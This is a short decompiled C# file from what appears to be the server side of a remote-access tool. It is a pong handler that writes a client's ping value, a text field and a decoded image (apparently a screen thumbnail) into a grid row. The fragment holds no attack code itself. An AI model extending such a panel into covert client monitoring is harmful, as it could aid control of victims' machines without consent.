using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Server.Connectings;

namespace Server.Messages
{
	// Token: 0x02000069 RID: 105
	internal class HandlerPong
	{
		// Token: 0x0600020A RID: 522 RVA: 0x00021308 File Offset: 0x0001F508
		public static void Read(Clients client, object[] objects)
		{
			if (client.Tag == null)
			{
				client.Disconnect();
				return;
			}
			client.lastPing.Last();
			DataGridViewRow dataGridViewRow = (DataGridViewRow)client.Tag;
			dataGridViewRow.Cells[15].Value = (int)objects[1];
			if (objects.Length > 2)
			{
				dataGridViewRow.Cells[16].Value = (string)objects[2];
				using (MemoryStream memoryStream = new MemoryStream((byte[])objects[3]))
				{
					dataGridViewRow.Cells[0].Value = new Bitmap(memoryStream);
				}
			}
		}
	}
}
